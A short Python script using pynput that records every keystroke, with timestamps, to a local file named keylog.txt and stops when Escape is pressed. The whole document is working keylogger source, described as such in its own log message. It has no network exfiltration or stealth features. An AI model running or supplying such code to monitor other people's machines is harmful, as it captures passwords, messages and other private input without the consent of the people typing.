from pynput.keyboard import Key, Listener
import logging

# Set up logging
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Define the function to handle key presses
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")
    
    # Exit the listener when 'esc' key is pressed
    if key == Key.esc:
        logging.info("Escape key pressed, stopping keylogger...")
        return False  # This stops the listener

# Start the listener
with Listener(on_press=on_press) as listener:
    listener.join()  # Keeps the listener running
